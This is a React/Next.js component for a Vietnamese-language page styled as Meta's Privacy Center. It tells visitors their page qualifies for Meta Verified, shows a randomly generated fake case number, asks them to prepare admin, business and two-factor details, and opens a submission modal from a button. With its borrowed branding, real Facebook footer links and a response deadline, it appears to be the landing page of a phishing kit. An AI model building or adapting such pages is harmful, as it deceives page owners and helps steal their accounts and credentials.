'use client'
import Link from 'next/link';
import React from 'react'

const MainContent = ({ handleOpendInfoModal }: { handleOpendInfoModal: () => void }) => {
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");
    const currentDate = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })

    const handleOpend = () => {
        handleOpendInfoModal();
    }

    React.useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();
    }, []);

    return (
        <>
            <div className="flex min-h-[100vh] w-full flex-col items-center justify-start bg-[radial-gradient(circle_at_top,rgba(24,119,242,0.12)_0%,rgba(245,249,255,1)_42%,rgba(255,255,255,1)_100%)] px-[16px] py-[28px]">
                <div className='w-full max-w-[860px]'>
                    <div className="rounded-[28px] border border-[#dbe9ff] bg-white p-[18px] shadow-[0_18px_45px_rgba(24,119,242,0.14)] sm:p-[28px]">
                        <div className='mb-[20px] flex flex-wrap items-center justify-between gap-[12px] rounded-[16px] bg-[#eef4ff] px-[16px] py-[10px] text-[#1f2a45]'>
                            <p className='text-[13px] font-semibold tracking-[0.02em]'>META PRIVACY CENTER</p>
                            <p className='text-[13px] font-medium text-[#3f4f70]'>Ngày phát hành: {currentDate}</p>
                        </div>

                        <div className='mb-[18px] flex items-start gap-[14px]'>
                            <div className='rounded-[18px] bg-[#e7f0ff] p-[14px] shadow-[0_8px_18px_rgba(24,119,242,0.16)]'>
                                <img src="images/icons/ic_blue.svg" className='h-[52px] w-[52px] sm:h-[58px] sm:w-[58px]' alt="Meta verified badge" />
                            </div>
                            <div>
                                <h1 className='text-[1.7rem] font-extrabold leading-[1.2] text-[#0b1f44] sm:text-[2.1rem]'>
                                    Gửi hồ sơ xác minh Meta Verified
                                </h1>
                                <p className='mt-[10px] text-[15px] leading-[1.65] text-[#33476a]'>
                                    Trang của bạn đã đủ điều kiện xét duyệt. Vui lòng hoàn tất hồ sơ để đội ngũ xác minh ưu tiên tiếp nhận và xử lý.
                                </p>
                                <p className='mt-[10px] text-[15px] leading-[1.65] text-[#33476a]'>
                                    Việc gửi hồ sơ đầy đủ giúp rút ngắn thời gian đối soát và tăng độ chính xác trong quá trình xác minh danh tính trang. Hệ thống sẽ tự động ghi nhận trạng thái hồ sơ theo mã theo dõi bên dưới.
                                </p>
                                <p className='mt-[8px] text-[14px] font-medium text-[#4c6087]'>Mã hồ sơ xác minh: #{ticketId}</p>
                            </div>
                        </div>

                        <div className='mb-[12px] rounded-[18px] border border-[#dce9ff] bg-[#f5f9ff] p-[16px]'>
                            <p className='mb-[8px] text-[16px] font-bold text-[#15356b]'>Lợi ích của việc xác minh</p>
                            <p className='text-[14px] leading-[1.6] text-[#3b4f75]'>
                                Xác minh giúp tăng mức độ tin cậy của thương hiệu, củng cố khả năng nhận diện chính thức và nâng cao chất lượng hiện diện của trang trong hệ sinh thái Meta.
                            </p>
                        </div>

                        <div className='rounded-[18px] border border-[#e5eefc] bg-[#fbfdff] p-[16px]'>
                            <p className='mb-[8px] text-[16px] font-bold text-[#122a55]'>Thông tin cần chuẩn bị</p>
                            <ul className='space-y-[8px] text-[14px] leading-[1.6] text-[#3d5075]'>
                                <li>- Thông tin quản trị viên và thông tin doanh nghiệp hợp lệ.</li>
                                <li>- Email/số điện thoại có thể xác minh ngay.</li>
                                <li>- Thiết lập bảo mật tài khoản và xác thực hai lớp.</li>
                            </ul>
                        </div>
                        <div className='mt-[12px] rounded-[18px] border border-[#dfe8f8] bg-[#f9fbff] p-[16px]'>
                            <p className='mb-[8px] text-[16px] font-bold text-[#1a3263]'>Quy trình xử lý hồ sơ</p>
                            <ul className='space-y-[8px] text-[14px] leading-[1.6] text-[#3a4f77]'>
                                <li>- Bước 1: Tiếp nhận hồ sơ và kiểm tra tính đầy đủ thông tin.</li>
                                <li>- Bước 2: Đối chiếu dữ liệu xác minh và mức độ tuân thủ chính sách.</li>
                                <li>- Bước 3: Cập nhật kết quả xét duyệt và hướng dẫn bước tiếp theo.</li>
                            </ul>
                        </div>
                    </div>

                    <button
                        type='button'
                        className='mx-auto my-[24px] block w-full max-w-[340px] rounded-full bg-[linear-gradient(90deg,#1877f2_0%,#1a9bff_100%)] px-[24px] py-[13px] text-[16px] font-semibold text-white shadow-[0_10px_22px_rgba(24,119,242,0.3)] transition duration-200 hover:brightness-105'
                        onClick={handleOpend}
                    >
                        Gửi hồ sơ xác minh Meta Verified
                    </button>
                    <div className='mt-[-8px] rounded-[16px] border border-[#ffe4b8] bg-[#fff8eb] p-[14px] text-[14px] leading-[1.6] text-[#7a5a1b]'>
                        Lưu ý quan trọng: Hồ sơ chỉ được phê duyệt khi thông tin kê khai đầy đủ, chính xác và có thể đối chiếu. Thời gian phản hồi tiêu chuẩn là 24 giờ làm việc; một số trường hợp có thể kéo dài nếu cần xác minh bổ sung.
                    </div>

                    <div className='mt-[26px] flex flex-wrap items-center justify-center gap-[14px] text-center text-[12px] text-[#6c7a94]'>
                        <Link href="https://www.facebook.com/privacy/policy" target="_blank" rel="noopener noreferrer">Chính sách quyền riêng tư</Link>
                        <span aria-hidden="true">•</span>
                        <Link href="https://www.facebook.com/legal/terms" target="_blank" rel="noopener noreferrer">Điều khoản</Link>
                        <span aria-hidden="true">•</span>
                        <Link href="https://transparency.fb.com/policies/community-standards/" target="_blank" rel="noopener noreferrer">Tiêu chuẩn cộng đồng</Link>
                        <span aria-hidden="true">•</span>
                        <Link href="https://www.facebook.com/help" target="_blank" rel="noopener noreferrer">Trung tâm trợ giúp</Link>
                        <span aria-hidden="true">•</span>
                        <Link href="https://www.facebook.com/business/help" target="_blank" rel="noopener noreferrer">Meta Business Help Center</Link>
                    </div>
                    <p className='mt-[10px] flex flex-wrap items-center justify-center gap-[6px] text-center text-[12px] leading-[1.6] text-[#7a879d]'>
                        <Link href="https://www.meta.com" target="_blank" rel="noopener noreferrer" className='text-[#7a879d] hover:underline'>
                            Meta © {new Date().getFullYear()}
                        </Link>
                        <span aria-hidden="true">•</span>
                        <span>Meta Platforms, Inc., Attention: Community Support, 1 Meta Way, Menlo Park, CA 94025</span>
                    </p>
                </div>
            </div>
        </>
    )
}

export default MainContent
